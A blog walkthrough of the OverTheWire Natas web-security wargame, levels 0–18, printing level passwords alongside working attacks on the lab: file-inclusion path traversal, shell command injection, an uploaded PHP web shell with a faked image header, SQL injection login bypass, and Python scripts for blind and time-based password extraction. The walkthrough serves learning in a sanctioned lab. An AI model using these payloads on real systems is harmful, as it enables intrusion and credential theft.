---
layout: post
title: OverTheWire Natas Walkthrough
---

## Introduction

Natas is a CTF designed to teach the basics of web application hacking. Each level has the password to the next level hidden somewhere within it.

Available at http://overthewire.org/wargames/natas/

To start

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

## Level 0

Viewing the page source gives

```html
<body>
<h1>natas0</h1>
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
</div>
</body>
```

## Level 1

Rightclicking is blocked but we can just use the dev tools of our browser to view the source again.

```html
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

## Level 2

```html
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
```
That files directory is worth investigating
```
Index of /files
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-	 
[IMG]	pixel.png	2016-12-15 16:07	303	 
[TXT]	users.txt	2016-12-20 05:15	145	 
Apache/2.4.10 (Debian) Server at natas2.natas.labs.overthewire.org Port 80
```
Bingo. Directory traversal is a common security concern with web apps. Opening users.txt gives us
```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## Level 3

```html
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
```
We know google specifically avoids robots.txt, let's have a look in there
```
User-agent: *
Disallow: /s3cr3t/
```
Opening /s3cr3t/ gives us another users.txt
```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

## Level 4

```
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 
```
Looks like the page is filtering based on the HTTP Referer header. We can fire up an intercepting proxy like `Burp Suite` to spoof these or manually send a http request with a tool like `curl`. I'm guessing burp will come in handy later so let's get that set up.

The default request looks like
```
GET / HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
DNT: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: __cfduid=da1bde76a1d5e9a74ef93e15934e7856a1525237844
Connection: close
```
If we add 
```
Referer: http://natas5.natas.labs.overthewire.org/
```
We get
```
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 
```

## Level 5

```
Access disallowed. You are not logged in
```
Inspecting the request gives
```
GET / HTTP/1.1
Host: natas5.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
DNT: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: __cfduid=da1bde76a1d5e9a74ef93e15934e7856a1525237844; loggedin=0
Connection: close
```
Let's set `loggedin=1`
```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

## Level 6
Level 6 has a form asking for a secret. Let's inspect the source
```
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```
Checking out includes/secret.inc gives us
```
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```
Entering the secret gives us
```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

## Level 7

Level 7 is a php app with home and about pages. Let's look at the source.

```
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the about page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```
I suspect this level is teaching us about local file inclusion vulnerabilities. Let's try browse to that file.

Change `index.php?page=home`

To `index.php?page=/../../../../../../etc/natas_webpass/natas8`
```
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```

## Natas 8

Level 8 is another form with a secret input. The source looks like

```
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
Lookes like is base64 encodes our input, reverses it and then converts it to hex and compares it to their encoded string. So we perform those steps in revers on their string and we will get the key.

Performing this process gives `oubWYf2kBq`
```
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

## Level 9

Level 9 has a form that takes an input and searches a dictionary file for matches.
```
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```
Looks like it uses the very exploitable php `passthru` function to construct a bash command.

In bash a semicolon allows us to sequence commands. If we feed `; cat /etc/natas_webpass/natas10` we have Remote Code Execution and get the flag.

```
Output:
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

African
Africans
...
```

## Level 10

This is where the fun begins. Level 10 is the same as Level 9, except now we get input validation.

```php
if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
```
Notably we still have `#` which is the bash comment symbol. Although it turns out it isn't necessary for this level. `grep` accepts multiple files as input so we just have to feed it a wildcard string to match and our password file like `.* /etc/natas_webpass/natas11`
```
.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:African
...
```

# Level 11

Level 11 has a form where we can change the background colour. Looking at the source gives us

```
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>
```

While it's more code than previous examples, it's not too hard to follow.

The source code
```
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
```
Constructs the array 
```
{"showpassword":"no","bgcolor":"#ffffff"}
```
It then XOR encrypts it with an unknown key.

If we visit the site we get served the base64 encoded cookie
```
data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
```

Using the cookie value and the plaintext value we should be able to determine the key, create a cookie with `"showpassword":"yes"`

Let's fire up a python3 shell to handle this.

```python
>>> import base64
>>> decoded = base64.b64decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=').decode('ascii')
>>> text = '{"showpassword":"no","bgcolor":"#ffffff"}'
>>> key = ''
>>> for c1,c2 in zip(decoded,text):
...     key +=chr(ord(c1) ^ ord(c2))
...
>>> print(key)
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq

```
Our key is qw8J. Now let's use it to encode a cookie
```python
>>> import base64
>>> key = 'qw8J'
>>> decoded = ''
>>> text = '{"showpassword":"yes","bgcolor":"#ffffff"}'
>>> for i in range(len(text)):
...     d = text[i]
...     decoded += chr(ord(d) ^ ord(key[i % len(key)]))
...
>>> print(base64.b64encode(decoded.encode('ascii')))
b'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'
```
So the cookie data we inject is `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`
```
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```

## Level 12

Level 12 asks to upload a file. Uploading is in general a high risk activity for web apps. We know this site is php, so if we can upload a php script we can likely get Remote Code Execution.

Write a script locally like

```php
<?php system($_GET['cmd']); ?>
```
When we upload it the script is saved as a jpeg. Even though the app provides a direct link to it we can't execute our script. Let's try intercept the upload request.

The message body is
```
------WebKitFormBoundaryH40qv1TXMwrFpo5X
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------WebKitFormBoundaryH40qv1TXMwrFpo5X
Content-Disposition: form-data; name="filename"

dw7vylfsn3.jpg
------WebKitFormBoundaryH40qv1TXMwrFpo5X
Content-Disposition: form-data; name="uploadedfile"; filename="temp.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryH40qv1TXMwrFpo5X--
```
If we rename `dw7vylfsn3.jpg` to `dw7vylfsn3.php` it still uploads correctly. Browse to the linked file, add a command parameter to the url and we have RCE. `cat` the password file and we are done.

```
http://natas12.natas.labs.overthewire.org/upload/dw7vylfsn3.php?cmd=cat%20/etc/natas_webpass/natas13
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

## Level 13

Same as Level 12 but we have some input validation this time.

Viewing the source code we can see it validates the file using the php function `exif_imagetype`. Let's see if we can spoof it using magic numbers.

First we upload an image and capture the request in our proxy.

```
------WebKitFormBoundaryfEFEKufAuFJ4NUeX
Content-Disposition: form-data; name="uploadedfile"; filename="download.jpg"
Content-Type: image/jpeg

ÿØÿà
```
Grab the start of the image data, copy it into another capture request were we try to upload an php command as above. Make sure to rename the file again.
```
oj6ah4y4jv.php
------WebKitFormBoundaryrcfbCeQiQY2IEsxl
Content-Disposition: form-data; name="uploadedfile"; filename="temp.jpg.php"
Content-Type: application/octet-stream

ÿØÿà <?php system($_GET['cmd']); ?>
```
Cat out the password as above
```
http://natas13.natas.labs.overthewire.org/upload/yf0pu7xdo5.php?cmd=cat%20/etc/natas_webpass/natas14
����JFIF��	Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```

## Level 14

Here we go, our first SQL Injection. We have a login form asking for a username and password.

Inspecting the source gives
```
<? 
if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas14', '<censored>'); 
    mysql_select_db('natas14', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    if(mysql_num_rows(mysql_query($query, $link)) > 0) { 
            echo "Successful login! The password for natas15 is <censored><br>"; 
    } else { 
            echo "Access denied!<br>"; 
    } 
    mysql_close($link); 
} else { 
?>
```
The two interesting bits are if we add a `?debug` to the post request we get some debugging information and we are given the structure of the SQL Query composed from our input

`"SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""`

Basically it adds " around our input from the fields and checks them against the database.

To bypass we make our username
```
" or 1 = 1 --
```
Which closes out the open " added to our input, has a boolen condition that always validates to true and then comments out the rest of the request, logging us in successfully.
```
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

## Natas 15

```
/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas15', '<censored>'); 
    mysql_select_db('natas15', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        echo "This user exists.<br>"; 
    } else { 
        echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
} else { 
?> 
```
Setting `username= " or 1 = 1 -- ` (note the trailing space) gives us this user exists, but we aren't closer to the password. `username=natas16` also exists, so looks like we will have to do a blind injection.

If we try `natas16" AND password = "a" -- ` this user does not exist.

If we try `natas16" AND password IS NOT NULL -- ` we get a this user exits.

Knowing we can test against the password and using one of several SQL statements (LIKE BINARY, strcmp) we can check each character until we reach the correct password.

Let's write a python script to a handle this.

```python
import requests

user = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
url = 'http://natas15.natas.labs.overthewire.org/index.php'
alphas  = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
passwd = ''

for i in range(0,32):
    for char in alphas:
        sql = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char  + '%" -- '}
        r= requests.post(url, auth=(user, password), data=sql)
        if 'exists' in r.text:
            passwd += char
            print(passwd)
            break
```
Running it gives
```
W
Wa
WaI
WaIH
WaIHE
WaIHEa
WaIHEac
WaIHEacj
WaIHEacj6
WaIHEacj63
WaIHEacj63w
WaIHEacj63wn
WaIHEacj63wnN
WaIHEacj63wnNI
WaIHEacj63wnNIB
WaIHEacj63wnNIBR
WaIHEacj63wnNIBRO
WaIHEacj63wnNIBROH
WaIHEacj63wnNIBROHe
WaIHEacj63wnNIBROHeq
WaIHEacj63wnNIBROHeqi
WaIHEacj63wnNIBROHeqi3
WaIHEacj63wnNIBROHeqi3p
WaIHEacj63wnNIBROHeqi3p9
WaIHEacj63wnNIBROHeqi3p9t
WaIHEacj63wnNIBROHeqi3p9t0
WaIHEacj63wnNIBROHeqi3p9t0m
WaIHEacj63wnNIBROHeqi3p9t0m5
WaIHEacj63wnNIBROHeqi3p9t0m5n
WaIHEacj63wnNIBROHeqi3p9t0m5nh
WaIHEacj63wnNIBROHeqi3p9t0m5nhm
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```
Pretty cool. We could have optimised this script by searching for matching characters anywhere in the password first by constructing the query `'username' : 'natas16" and password LIKE BINARY "%' + char  + '%" -- '` and then passing the resulting filtered string to our character search, but honestly it was pretty quick regardless.

## Level 16

Level 16 looks the same as level 9 and 10, but with more input filtering.

At the moment our input is passed into a grep string like bellow

`grep -i "our input" dictionary.txt`

Our input is wrapped `""` preventing the earlier attacks. Still `$,(,),` are not filtered, so we should be able to perform command substitution.

In level 15 we used a boolean based blind injectection against SQL. This means we perform an SQL query and from the output we can determine if it was true or false. Using this boolean value we test against the each letter in the password string for possible characters and eventually determine the entire password.

This time we're performing a similar attack, posting a query to get a true or false value determined by interpreting the response, except it is against a bash passthrough. Let's break out a python script again.

```python
import requests

user = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
url = 'http://natas16.natas.labs.overthewire.org/'
alphas  = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''

for char in alphas:
    brute_string = 'needle=$(grep ' + char + ' /etc/natas_webpass/natas17)hackers'
    r= requests.post(url, auth=(user, password), params=brute_string)
    if 'hackers' not in r.text:
        filtered += char
        print(filtered)

for i in range(32):
    for char in filtered:
        brute_string = 'needle=$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)hackers'
        r = requests.post(url, auth=(user, password), params=brute_string)
        if 'hackers' not in r.text:
            passwd = passwd + char
            print(passwd)
            break
```
Notice we used a second loop to filter the characters first for speed like we discussed above. Gives the output
```
b  
bc  
bcd  
bcdg  
bcdgh  
bcdghk  
bcdghkm  
bcdghkmn  
bcdghkmnq  
bcdghkmnqr  
bcdghkmnqrs  
bcdghkmnqrsw  
bcdghkmnqrswA  
bcdghkmnqrswAG  
bcdghkmnqrswAGH  
bcdghkmnqrswAGHN  
bcdghkmnqrswAGHNP  
bcdghkmnqrswAGHNPQ  
bcdghkmnqrswAGHNPQS  
bcdghkmnqrswAGHNPQSW  
bcdghkmnqrswAGHNPQSW3  
bcdghkmnqrswAGHNPQSW35  
bcdghkmnqrswAGHNPQSW357  
bcdghkmnqrswAGHNPQSW3578  
bcdghkmnqrswAGHNPQSW35789  
bcdghkmnqrswAGHNPQSW357890  
8  
8P  
8Ps  
8Ps3  
8Ps3H  
8Ps3H0  
8Ps3H0G  
8Ps3H0GW  
8Ps3H0GWb  
8Ps3H0GWbn  
8Ps3H0GWbn5  
8Ps3H0GWbn5r  
8Ps3H0GWbn5rd  
8Ps3H0GWbn5rd9  
8Ps3H0GWbn5rd9S  
8Ps3H0GWbn5rd9S7  
8Ps3H0GWbn5rd9S7G  
8Ps3H0GWbn5rd9S7Gm  
8Ps3H0GWbn5rd9S7GmA  
8Ps3H0GWbn5rd9S7GmAd  
8Ps3H0GWbn5rd9S7GmAdg  
8Ps3H0GWbn5rd9S7GmAdgQ  
8Ps3H0GWbn5rd9S7GmAdgQN  
8Ps3H0GWbn5rd9S7GmAdgQNd  
8Ps3H0GWbn5rd9S7GmAdgQNdk  
8Ps3H0GWbn5rd9S7GmAdgQNdkh  
8Ps3H0GWbn5rd9S7GmAdgQNdkhP  
8Ps3H0GWbn5rd9S7GmAdgQNdkhPk  
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq  
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9  
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c  
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

## Level 17

This looks the same as Level 15. Let's check out the source code.

```
<? 

/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas17', '<censored>'); 
    mysql_select_db('natas17', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        //echo "This user exists.<br>"; 
    } else { 
        //echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        //echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
} else { 
?>
```
The only difference is all output is commented out. When an SQL query does not give output but is injectable, the options left are sending data back over the network or time based attacks. As networking options are limited in Natas, let's try a time  attack. Basically we submit a bunch of boolean queries with sleep() functions in them, if any take a longer time to come back then the boolean tested true. We use this true result to determine the password one character at a time like the earlier levels.

Let's modify our python script from Level 15.

```python
import requests

user = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
url = 'http://natas17.natas.labs.overthewire.org/index.php'
alphas  = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
passwd = ''

for i in range(0,32):
    for char in alphas:
        sql = {'username' : 'natas17" and password LIKE BINARY "' + passwd + char  + '%" and sleep(5) -- '}
        r= requests.post(url, auth=(user, password), data=sql)
        if (r.elapsed.seconds >= 10):
            passwd += char
            print(passwd)
            break
```
And we should get
```
x  
xv  
xvK  
xvKI  
xvKIq  
xvKIqD  
xvKIqDj  
xvKIqDjy  
xvKIqDjy4  
xvKIqDjy4O  
xvKIqDjy4OP  
xvKIqDjy4OPv  
xvKIqDjy4OPv7  
xvKIqDjy4OPv7w  
xvKIqDjy4OPv7wC  
xvKIqDjy4OPv7wCR  
xvKIqDjy4OPv7wCRg  
xvKIqDjy4OPv7wCRgD  
xvKIqDjy4OPv7wCRgDl  
xvKIqDjy4OPv7wCRgDlm  
xvKIqDjy4OPv7wCRgDlmj  
xvKIqDjy4OPv7wCRgDlmj0  
xvKIqDjy4OPv7wCRgDlmj0p  
xvKIqDjy4OPv7wCRgDlmj0pF  
xvKIqDjy4OPv7wCRgDlmj0pFs  
xvKIqDjy4OPv7wCRgDlmj0pFsC  
xvKIqDjy4OPv7wCRgDlmj0pFsCs  
xvKIqDjy4OPv7wCRgDlmj0pFsCsD  
xvKIqDjy4OPv7wCRgDlmj0pFsCsDj  
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh  
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd  
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```
Again we could do the optimisation where we find filtered characters first like we did in Level 16.

## Level 18

```php
function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas19\n"; 
    print "Password: <censored></pre>"; 
    } else { 
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."; 
    } 
}
```